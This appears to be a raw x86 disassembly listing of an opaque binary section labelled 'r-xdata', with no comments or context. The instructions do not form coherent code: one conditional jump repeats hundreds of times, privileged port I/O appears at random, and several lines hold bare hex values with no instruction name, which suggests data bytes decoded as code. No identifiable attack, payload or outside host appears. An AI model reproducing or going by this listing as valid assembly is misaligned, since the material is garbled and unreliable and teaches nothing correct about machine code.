jpo r-xdata
call 0x7bc2edfe
jpo r-xdata
sub eax [ edx ]
jmp r-xdata
jpo r-xdata
arpl bx sp
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
nop
in al 0x6f
jpo r-xdata
adc al 0x14
push cs
mov dh 0x28
jpo r-xdata
mov al 0x60
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
cld
jpo r-xdata
pushad
adc al 0x14
mov ch 0x2
mov eax 0x7bebebeb
jpo r-xdata
jpo r-xdata
mov esi 0x142dc902
adc al 0x7b
mov esi 0x76a0760
jmp r-xdata
popad
cmpsb [ esi ] [ edi ]
jmp r-xdata
cmc
jpo r-xdata
sar [ esi ] cl
mov esp 0x28fad62
jpo r-xdata
cmp [ edx - 0x2dfd7053 ] 0x7b14143e
lea esp [ edx - 0x6a ]
add eax 0x14310402
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
add eax 0x7bebebe8
jpo r-xdata
jpo r-xdata
out 0xeb eax
add esi ebp
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
push 0x2402e929
push esi
jpo r-xdata
sub esp [ esi - 0x4f ]
cmp ebp [ eax + 0x10 ]
jpo r-xdata
mov ss [ ebx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
add ecx [ ebx ]
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
add al [ ebx + ecx ]
bound edi [ esi - 0x617e4e8f ]
bound ebp [ esi - 0x7d7e4ce7 ]
add bh [ ecx + eax + 0x7b7b1414 ]
adc al 0x14
bound ebp [ ebp + 0x3ed2028f ]
lea esp [ edx - 0x52 ]
sbb [ ebx - 0x43fd7d7f ] esi
add [ esp + edx ] edx
jpo r-xdata
lodsd [ esi ]
pop [ edx ]
xchg edi eax
bound edi [ esi - 0x699d728d ]
jpo r-xdata
pop ss
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
adc al 0x14
add edi edi
loope r-xdata
or [ ebp - 0x4ce6519e ] 0x8d
bound ebp [ esi + 0x28e811f ]
or al 0x35
adc al 0x14
jpo r-xdata
adc al 0x14
rol [ ebx ] 0x1
jpo r-xdata
mov cl 0x3b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub ah ah
jpo r-xdata
jpo r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
pushad
adc eax [ ecx + 0x7d14bc8f ]
jpo r-xdata
sub dl [ ds : esp + edx ]
add ch [ eax + 0x5 ]
adc al 0x14
jpo r-xdata
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
add al 0x31
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
jae r-xdata
add al ch
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x14b830d8
outsb
pop edi
adc edx [ esp + edx ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + esi * 8 - 0x1494147d ]
mov al 0x28
jpo r-xdata
jpo r-xdata
jmp r-xdata
lahf
adc [ esp + edx ] dl
mov al 0x28
jpo r-xdata

add ebp [ esi + ebp ]
adc al 0x14
fcomp [ 0xffffffffb6022b6e ]
aaa
adc al 0x14
jpo r-xdata
push 0xd102e210
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
or [ edi + 0x5b7d14bc ] 0xb8ebebeb
add al [ eax + 0x1b ]
adc al 0x14
jpo r-xdata
outsd
in al 0x6e
inc esp
out 0xeb eax
jmp r-xdata
mov edx 0x62bc818c
jpo r-xdata
cmp al 0x68
adc ebp edx
in al 0x6e
bound edx [ esi - 0x6c7e4b81 ]
mov cl 0x81
lodsb [ esi ]
lea esp [ edx - 0x42 ]
jno r-xdata
adc al 0x14
jpo r-xdata
cmp [ ecx + 0x628db38e ] eax
scasb [ edi ]
imul edx [ esi + 0x6ee4eafb ] 0x5d
add dl [ esp + edx ]
mov eax 0x16236e66
adc al 0x14
jpo r-xdata
lodsd [ esi ]
jpo r-xdata
jpo r-xdata
and [ esi ] 0xfffffffa
jmp 0x5049c23d
bound ebp [ ebp + 0x3afe03f7 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
and edx [ esi ]
jpo r-xdata
loop r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dh [ edx ]
sub [ esp + edx ] dl
jpo r-xdata
mov ebx 0xeb037c14
jpo r-xdata
scasb [ edi ]
cmp eax [ edx ]
call 0x7bc2f173
adc al 0xbd
out dx eax
mov esp 0x32d60bb
mov ah 0x37
adc al 0x14
push 0xee02fb2f
loop r-xdata
jpo r-xdata
cmp eax 0x14149c02
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
mov esp 0xeb5b7d14
jmp r-xdata
jpo r-xdata
scasb [ edi ]
cmp esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0xb8
mov ebx 0xebebd502
jmp r-xdata
sbb [ esi + 0x77be628d ] 0x1437e302
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc edx [ esp + edi * 4 ]
mov edi 0x6fe42b6e
or ebx [ esi ]
adc al 0x14
mov eax 0xae66ef81
aaa
mov ebx 0x6013ae60
imul ecx [ edi - 0x15 ] 0xffffffeb
jmp r-xdata
jpo r-xdata
pushad
adc al [ edx ]
stosd [ edi ]
push ebp
adc al 0x14
jpo r-xdata
jmp r-xdata
adc al 0xbb
adc al 0x7c
add ebp ebx
sub al 0xae
pop es
cwde
add edi esi
cmp dl [ esp + edx ]
adc [ edx + 0x14126b02 ] 0x817b7b14
adc al 0x14
jpo r-xdata
xchg esi eax
sti
0x25d6ee4 0x1414
test [ ebx ] 0x14143afe
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jl r-xdata
mov esp 0x206ae62
lds eax [ eax ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x16b76e66
jpo r-xdata
adc al 0x14
pushad
movsd [ edi ] [ esi ]
retn
pop ebx
adc al 0x7d
jpo r-xdata
jpo r-xdata
and esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0x2
adc edx [ esp + edx ]
adc al 0x60
jpo r-xdata
adc al 0x14
jpo r-xdata
sub eax [ edx ]
add al 0xb
bound ebp [ ebp + 0x1f ]
mov esp 0xeb2f5562
jmp r-xdata
adc [ edi + 0x30 ] 0x40
push esi
add ch dh
jge r-xdata
mov dl 0xd8
out dx al
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop ss
mov ebx 0xafbd14b8
pushad
scasb [ edi ]
pop ss
add edx [ ecx + 0x66ebebe1 ]
jpo r-xdata
adc eax 0xebeaef83
jmp r-xdata
jpo r-xdata
or [ esi - 0x72787e4d ] 0xb31dae62
or [ ebp + 0x13ae628d ] 0x8dc581b3
bound ebp [ esi + 0x628db311 ]
scasb [ edi ]
cmp esi [ ebx + 0x39ae628d ]
or [ esi - 0x519d724d ] 0x8d2bd83f
bound edi [ esi - 0x519d72db ]
cmp eax 0x1fa6628d
jpo r-xdata
xchg esi eax
xor esp [ esi + 0x66 ]
pop ebx
push ss
adc al 0x14
add esi esi
loope r-xdata
jpo r-xdata
xchg edx eax
add ch [ ebx + 0x12 ]
adc al 0x14
jpo r-xdata
inc ebx
jmp r-xdata
jl r-xdata
mov ebx 0x2efc02b8
jpo r-xdata
push ss
adc al 0x7c
jae r-xdata
adc al 0x14
mov ebx 0x135f6e66
adc al 0x14
mov ebx 0x66c3bd14
adc al 0xb8
outsb
and edx [ esi ]
outsb
add bl dl
push ecx
adc al 0x14
mov edx 0x14312a02
adc al 0x7b
jpo r-xdata
jmp r-xdata
add ch [ edx ]
xor [ esp + edx ] edx
jpo r-xdata
xchg ecx eax
jpo r-xdata
jpo r-xdata
outsb
fsubr [ ebx ]
jpo r-xdata
pushad
lodsb [ esi ]
xor [ esp + edx ] edx
jpo r-xdata
mov ebx 0x23bae66
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
sub ecx ebp
add ah [ esi + edx * 2 ]
and eax 0x66661414
pop ebx
jmp r-xdata
loope r-xdata
jpo r-xdata
out dx eax
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
outsb
sub esp esp
outsb
and bh ch
jmp r-xdata
jmp r-xdata
add dh [ edx + 0x21 ]
adc al 0x14
jpo r-xdata
cdq
lea esp [ edx - 0x52 ]
add [ edx + 0x19ae628d ] 0xae628db3
pop ds
or [ esi + 0x14350c02 ] 0xb07b7b14
sub [ ebx + 0x7b ] bh
jmp r-xdata
adc al 0x14
add bh ah
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
call 0x146f37bb
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0xbb
cmpsd [ esi ] [ edi ]
outsb
sub esp esp
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
add edx [ esp + edx ]
add dl cl
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
mov ebx 0xd88fbd14
and ch [ eax + 0x13 ]
adc al 0xe4
jle r-xdata
push ss
outsb
scasb [ edi ]
adc al 0x7b
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
0x6e66ebeb 0x165b
sahf
out dx al
jmp r-xdata
in al 0x6e
outsb
outsb
cmp ecx [ ebp - 0x4ef0419e ]
or ebx 0x14555602
adc al 0xb8
mov eax 0x11576e66
adc al 0x14
punpckldq mm6 [ esi - 0xc43ebc9 ]
mov esp 0x14089902
adc al 0x7b
jpo r-xdata
outsd
xchg edi eax
mov ebx 0xe42b6ea7
pop ds
xchg si ax
jpo r-xdata
or [ esi + 0x21720287 ] 0x14
adc al 0x7b
jpo r-xdata
mov eax 0x142e6002
adc al 0x7b
mov ebx 0x9807ae2c
clc
jpo r-xdata
adc al 0x14
add bh al
sbb dl [ esp + edx ]
jpo r-xdata
outsb
mov bh 0x16
adc al 0x14
jpo r-xdata
lodsd [ esi ]

xchg esi eax
jpo r-xdata
in al 0x7e
sub ah [ eax + 0x12 ]
add ch [ ebx + 0x7b141455 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
fsubr [ ebx ]
lea esp [ edx - 0x42 ]
and eax 0x3dae628d
lea esp [ edx - 0x5a ]
pop ds
mov bl 0x8d
jpo r-xdata
adc al 0x7b
jpo r-xdata
sub ebp [ ebx + 0x1413f802 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
add ebx eax
jpo r-xdata
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x4c717ec7 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jpo r-xdata
add bh al
add esi esi
jmp 0x6702f456
mov dl 0x8d
fsub st1
jmp r-xdata
jpo r-xdata
outsd
or [ esi + 0x14 ] bl
jpo r-xdata
sbb edx [ esp + edx ]
outsb
push edi
adc [ esp + edx ] edx
add dh [ eax + 0x38 ]
adc al 0x14
jpo r-xdata
loope r-xdata
push 0x2b6ee72f
add ch [ ecx + 0x17 ]
pop ss
fsubr [ ebx ]
lea esp [ edx - 0x52 ]
lds ecx [ ebp - 0x4cee519e ]
lea esp [ edx - 0x52 ]
jpo r-xdata
push 0xeaffcf97
in al 0x6e
arpl [ ebp + 0x14 ] dx
adc al 0x60
test al 0xfb
outsb
sub eax [ edx ]
clc
daa
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esp [ esi + 0x60898111 ]
jmp r-xdata
push ss
adc al 0x14
adc al 0x14
pop bx
das
out 0x6e eax
sub eax [ edx ]
imul edx [ edi ] 0x7b7b1414
mov ebx 0xf5a85de4
test al 0xd3
pop esi
adc al 0x14
in al 0x5d
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp esp esp
outsd
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
iretd
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc [ ecx - 0x72dc9f77 ] eax
bound esp [ esi - 0x72dd27e9 ]
bound esp [ esi - 0x1387fdeb ]
adc al 0xe4
jpo r-xdata
scasd [ edi ]
iretd
jpo r-xdata
mov ebx 0x60b39814
sub eax 0x14284402
adc al 0xe4
outsd
out dx eax
jmp r-xdata
test al 0xf5
sub eax 0x3eb14ae
imul cl
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
pop es
pop esi
cmp edx [ esi ]
adc al 0x14
adc al 0xbc
sti
add dl [ ecx ]
push cs
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
xor ebp [ esi ]
adc al 0x14
add al [ ecx + 0x7b14142a ]
jpo r-xdata
sub esp esp
outsd
push 0x3d02c614
add [ esp + edx ] edx
0x55636ee4 0x1414
jpo r-xdata
jpo r-xdata
pop ebp
jpo r-xdata
adc al 0xaf
iretd
jpo r-xdata
adc al 0xeb
pop ebx
fstp [ eax + 0x3a03ed62 ]
adc al 0x9e
jmp r-xdata
in al 0x5c
test al 0xf7
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
pop es
pushad
scasb [ edi ]
pop ds
mov [ ebp - 0x4cf6519e ] ecx
or [ edx + 0xfae628d ] 0x14573b02
adc al 0x60
xor cl [ ebp + 0x60a5b662 ]
pop ebp
xchg esi eax
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
out 0x62 eax
0x3e7302b8 0x1414
bound edx [ esi + 0x14b8bb17 ]
mov ebp 0x17ae60af
bound ebp [ edi + 0x28d0f7cf ]
add ch [ esi ]
or edx [ esp + edx ]
jpo r-xdata
and ecx [ ebp - 0x27e8599e ]
and cl [ ebp + 0x215a662 ]
js r-xdata
pushad
scasb [ edi ]
cvtpi2ps xmm2 [ ebx ]
hlt
sar [ ebx - 0xa57a21c ] cl
jpo r-xdata
iretd
add bh [ 0x14141401 ]
lahf
adc al 0x6d
push edi
jmp r-xdata
adc dx [ esi ]
adc al 0x14
add esp [ ebp + 0x1b ]
adc al 0x14
dec edi
adc eax 0x2bd1414
salc
sbb [ esp + edx ] dl
mov ebx 0xebeea803
jmp r-xdata
lea ebp [ esi + 0x39 ]
in al 0x6f
xor al 0x8d
bound esi [ esi + 0xc0f02bb ]
adc al 0x14
lea esp [ edx - 0x52 ]
or eax 0x14037c02
adc al 0x7b
jpo r-xdata
pushad
jpo r-xdata
mov ebp 0xef8503bb
jmp r-xdata
daa
adc al 0x14
add [ eax - 0x4724a443 ] 0x62
insd
pop es
sbb [ edx - 0x4724a443 ] 0x62
in eax dx
and [ esi - 0x699d724c ] 0x3c3a0253
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x5d
lea esp [ edx - 0x4a ]
mov ebx 0x140c0f02
adc al 0x8d
bound ebp [ esi + 0x37c020d ]
adc al 0x14
jpo r-xdata
adc esp [ edx - 0x52 ]
cmp esp [ esi - 0x52 ]
cmp edi [ ebx + 0x1405dd02 ]
adc al 0x7b
pushad
lodsd [ esi ]
fist [ esi + ebx * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x8d
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop ebx
jpo r-xdata
lea esp [ edx - 0x42 ]
stosd [ edi ]
pushad
xor ebx eax
jpo r-xdata
bound edx [ esi + 0x3c3a0253 ]
bound ebp [ esi - 0x27d427e5 ]
cmp [ edx - 0x52 ] esp
pop ss
add dl [ eax + 0x7b141405 ]
jpo r-xdata
pushad
scasb [ edi ]
pop ss
bound ebp [ esi + 0x13ae6003 ]
bound ebp [ esi + 0x1fae6007 ]
in al 0x6e
dec edi
pop ds
adc al 0x14
mov ch 0x28
jpo r-xdata
jge r-xdata
add edi [ edx ]
0xb8db5bbd 0xed62
xor dh [ ecx + 0xdb6628d ]
lea esp [ edx - 0x6a ]
sbb eax 0x1401d202
adc al 0x7b
jpo r-xdata
cmp [ ecx - 0x499d7264 ] eax
jge 0x60f0c93d
mov esi 0xd83360ab
add edx [ ecx - 0x7e141411 ]
sti
scasb [ edi ]
adc al 0x9f
jpo r-xdata
adc al 0x14
mov ebx 0x145f7602
adc al 0x8d
jmp r-xdata
fsubr [ ebx ]
add al dh
adc al 0x14
jpo r-xdata
bound esp [ esi + 0x311d02cf ]
adc al 0x14
jpo r-xdata
jpo r-xdata
sahf
adc al 0x14
jpo r-xdata
jg r-xdata
jpo r-xdata
adc al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
lahf
pushad
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
scasd [ edi ]
iretd
lea esp [ edx - 0x51 ]
jpo r-xdata
add [ ebx + esi * 4 + 0x628d9b81 ] 0xb3d7cfaf
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
scasd [ edi ]
iretd
jpo r-xdata
or [ esi - 0x30509d73 ] 0x8581b3d5
jpo r-xdata
jpo r-xdata
bound edx [ edi + 0x3bdffcf ]
or bl ch
jmp r-xdata
lea esp [ edx - 0x5a ]
iretd
scasd [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
0x14f3cfaf 0xcfaf
lea esp [ edx - 0x51 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
fwait
lea esp [ edx - 0x51 ]
jpo r-xdata
0xcfaf628d 0xd8a9
bound ebp [ edi - 0x7e4c5431 ]
jpo r-xdata
jpo r-xdata
iretd
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ecx
call 0x2faff711
out 0x66 eax
scasb [ edi ]
aas
mov ebx 0x14237002
adc al 0x7b
jpo r-xdata
bound ebp [ esi - 0x347e4cfb ]
bound ebp [ edi - 0x7e4c2831 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aad 0xb3
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
mov esp 0x9662b8bc
pop ss
adc al 0xbd
jmp r-xdata
iretd
jpo r-xdata
mov bl 0x81
jecxz r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
add [ ebp - 0x30509d73 ] 0xea81b3ab
lea esp [ edx - 0x51 ]
iretd
jpo r-xdata
add eax 0x8dcb81b3
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
int1
jmp r-xdata
push ebp
aaa
adc al 0x14
mov dl 0x6e
add bl [ ecx + 0x7b14141d ]
push 0x7
or ebx 0x1bae628d
mov bl 0x81
into
mov bl 0x81
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ edx + eax + 0x141439fe ] edi
jpo r-xdata
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb esi [ ebx - 0x66fd317f ]
sbb eax 0x6a7b1414
pop es
jpo r-xdata
bound ebp [ edi - 0x7e4c2a31 ]
jpo r-xdata

jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4ce5 ]
add eax [ ecx - 0x18 ]
jmp r-xdata
test [ ebp - 0x5430509e ] ecx
mov bl 0x81
jpo r-xdata
sub_46fa3c
push ds
out 0xeb al
jmp r-xdata
bound ebp [ esi - 0x717e4cc5 ]
lea esp [ edx - 0x52 ]
lea esp [ edx - 0x5a ]
aas
mov dl 0x81
xchg ebx eax
lea esp [ edx - 0x5a ]
cmp eax 0x8d8a81b2
bound esp [ esi - 0x737e4dcd ]
jpo r-xdata
lahf
iretd
jpo r-xdata
mov eax 0x14074902
adc al 0x7b
jpo r-xdata
add ebx [ esi ]
clc
jmp r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x6e
pop esi
xor [ esp + edx ] dl
add al [ ebp + 0x30 ]
cmp [ ebx + 0x2028581 ] esi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
push ss
mov esp 0x14eb81c7
jl r-xdata
xor [ edx + 0x628dc581 ] esi
cmpsb [ esi ] [ edi ]
aaa
cmpsb [ esi ] [ edi ]
xor esi [ edx + 0x628d8c81 ]
cmpsb [ esi ] [ edi ]
and ch [ esi + 0x2b ]
jpo r-xdata
jpo r-xdata
out 0xeb al
jmp r-xdata
sahf
jecxz r-xdata
bound ebp [ esi + 0x1150021f ]
adc al 0x14
scasb [ edi ]
add edi [ ebx + 0x14261e02 ]
adc al 0x14
sahf
sbb esp [ edx - 0x4a ]
and edi [ edx + eax + 0x14143ddc ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
fsub [ edx ]
jpo r-xdata
in eax dx
add bl [ esi ]
das
adc al 0x14
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
pop ds
jge r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xlat
loope r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub ah [ edx ]
sub [ ebx + 0x7b ] bh
outsb
sub esp esp
jb r-xdata
jpo r-xdata
adc al 0xbb
adc al 0x9e
aaa
add cl [ eax ]
and al 0x14
in al 0x6e
push ss
stc
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db047 ]
mov dh 0x45
sbb [ eax + 0x55a6628d ] 0x29f81b2
bound esp [ edi ]
adc [ esp + edx ] dl
scasb [ edi ]
btc [ edx ] eax
pop ds
add dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc edi 0xffffffe1
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x5a ]
add ch [ ebx + 0xf ]
jpo r-xdata
mov dl 0x8d
bound esp [ esi - 0x72dc9fcb ]
bound ebp [ esi + 0x22bd80f ]
mov [ ebp - 0x4dce599e ] cs
add ebp 0x37a6628d
pop ss
add eax [ edi + 0x3 ]
mov bl 0x62
scasb [ edi ]
enter 0x62b3 0xae
jpo r-xdata
sub esp esp
outsb
cli
mov esi 0x2ba0760
cmp [ eax ] ah
adc al 0x14
jpo r-xdata
in al 0x72
sub ah [ eax + 0x2a ]
and ch [ eax ]
jpo r-xdata
fsubr [ ebx ]
stosd [ edi ]
add ch [ esi + 0x11 ]
jpo r-xdata
adc al 0x9e
add eax [ edx ]
adc al 0x14
jpo r-xdata
xchg edi eax
iretd
bound esi [ esi - 0x72cf27f3 ]
bound esi [ esi + 0x2316003 ]
add al [ edx + 0x22 ]
adc al 0x14
add esi [ edx ]
outsb
outsd
push esi
adc al 0x14
fcom [ edx + edx * 8 ]
jpo r-xdata
cwde
jmp r-xdata
jpo r-xdata
add cl bl
add [ esp + edx ] edx
outsb
sub esp esp
outsd
int 0x1
adc al 0x14
fsubr [ ebx ]
stosd [ edi ]
bound edi [ esi - 0x419d723b ]
fild [ ecx + 0x628db192 ]
mov esi 0xb18f81d9
push ebp
mov dl 0x81
lahf
cmpsb [ esi ] [ edi ]
adc al 0x14
add esp [ ecx + 0x11 ]
adc al 0x14
mov dl 0xb2
outsb
push ss
adc al 0x14
bound ebp [ esi + 0x3470317 ]
jpo r-xdata
pushad
sub eax 0xebf81302
jmp r-xdata
in al 0x68
add al 0x3d
adc al 0x14
pushad
cmpsb [ esi ] [ edi ]
pop ss
push 0xa662ff2a
pop ss
add dh [ 0x7b14142f ]
add esp [ ecx ]
adc dl [ esp + edx ]
mov ebx 0xbb1fae66
scasb [ edi ]
sub eax [ edx ]
add al 0x14
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x5a ]
outsb
jpo r-xdata
sti
jmp r-xdata
add eax [ eax + 0x3d ]
adc al 0x14
add dl [ ebp + 0x7b141423 ]
call 0x49300da
lea esp [ edx - 0x42 ]
fild [ ecx + 0xc2a0289 ]
adc al 0x14
jpo r-xdata
xchg edx eax
mov cl 0x8d
bound edi [ esi - 0x4e707e27 ]
adc al 0x14
jpo r-xdata
imul ecx [ edi ] 0x14
adc al 0x7b
lea esp [ edx - 0x42 ]
lds ecx [ ebp - 0x7e24419e ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
fdivr [ 0x7b7b1414 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x52 ]
or eax 0x28581b3
add [ eax ] dh
mov esp edx
jmp r-xdata
lea esp [ edx - 0x4a ]
pop ecx
add dl [ ecx + edi + 0x14 ]
adc al 0x7b
mov eax 0x2039e14
cmp bh bl
adc al 0x14
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
add dl [ eax + 0x1f ]
adc al 0x14
jpo r-xdata
mov ebx 0x1401d302
adc al 0x81
lds esi [ edx - 0x141d63fe ]
jmp r-xdata
inc edi
add edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sbb eax eax
sbb ch [ eax + 0x2a ]
jmp 0x34159b1
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x5
adc al 0x14
jpo r-xdata
pushad
and ecx [ ebp - 0x27f0519e ]
sub eax [ edx ]
jpo r-xdata
add bl [ edi ]
adc al 0x14
jpo r-xdata
add edx [ esp + edx ]
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
add ch [ ecx + 0x10 ]
adc al 0x14
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
0xbc14ebeb 0x14e3
push 0x1f83ff2f
lea esp [ edx - 0x52 ]
jpo r-xdata
pushad
xor cl [ ebp + 0x249b662 ]
or al 0x1f
adc al 0x14
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
popad
adc al 0x7b
add eax 0x7b14140b
jpo r-xdata
mov dh 0x3
pushad
xor [ edx ] eax
out 0xeb eax
jmp r-xdata
cmp al [ ebx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov bh 0xb8
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
mov dl 0x8d
bound esi [ esi + 0x39540259 ]
adc al 0x14
jpo r-xdata
outsb
add al 0x24
adc al 0x14
mov ebx 0x2379e14
or [ esp + edx ] ah
jpo r-xdata
jmp r-xdata
mov esi 0xbaba0760
add ch [ eax ]
in al 0xeb
jmp r-xdata
psubusb mm5 [ ebx ]
add dh [ ebp + eax + 0x7b7b1414 ]
scasb [ edi ]
cmp edx [ esi ]
adc al 0x14
mov ebx 0xe61d02b8
jmp r-xdata
outsb

lea esp [ edx - 0x4a ]
or esi [ eax + 0x628ddd81 ]
xchg esi eax
add esi [ ecx + eax * 4 - 0x419d7221 ]
lodsd [ esi ]
out 0x3 eax
xchg edx eax
xor edx [ esp + edx ]
and [ edx - 0x438ac7a0 ] 0x62
lodsd [ esi ]
sti
add eax [ eax + 0x68141433 ]
das
stosd [ edi ]
add cl [ ecx + 0x7b141435 ]
jpo r-xdata
bound ebp [ esi - 0x72d29fc1 ]
bound ebp [ esi - 0x72d79fc3 ]
bound ebp [ esi - 0x72d59fcd ]
bound ebp [ esi + 0x22d6031 ]
push eax
adc dl [ esp + edx ]
lea esp [ edx - 0x1d ]
sub [ ebx + 0x60 ] bh
pop es
mov edx 0x3bcbdb8
jpo r-xdata
sti
add ch [ edx ]
out 0xeb eax
jmp r-xdata
jpo r-xdata
sub ebx 0xffffffeb
adc al 0x7b
jpo r-xdata
fsubr [ ebx ]
mov ebp 0x17ae62bc
bound ebp [ esi + 0x13ae621f ]
add dl [ ecx ]
sub [ esp + edx ] edx
xor [ fs : esp + edx ] edx
lea ebp [ esi + 0x1d ]
in al 0x6e
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov bl 0x81
pushfd
lea esp [ edx - 0x52 ]
lar eax [ edi + 0xe ]
adc al 0x14
jpo r-xdata
sub cl [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec esp
add al 0x14
adc al 0xd0
scasb [ edi ]
out 0xe4 eax
jpo r-xdata
mov ebp 0xfb3a03bb
bound ebp [ esi + 0x6fae6613 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
push ds
inc eax
cmp eax 0x95021414
and edx [ esp + edx ]
in al 0x5c
[ edx + 0x68549166 ]
adc al 0xf2
in al 0x6c
call 0x6932e9d1
sub ebx ecx
adc al 0x14
jpo r-xdata
pop edi
cmp [ esp + edx ] dl
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
shr [ esi + 0x1e6fe4e7 ] 0x1
jpo r-xdata
jpo r-xdata
sti
jpo r-xdata
outsb
sub esp esp
outsd
jpo r-xdata
mov [ ebx + 0x628d8f81 ] esi
scasb [ edi ]
add esi [ ebx + 0x628d8a81 ]
scasb [ edi ]
add [ ebx + 0x628d8c81 ] esi
scasb [ edi ]
outsb
and edx [ esi ]
jpo r-xdata
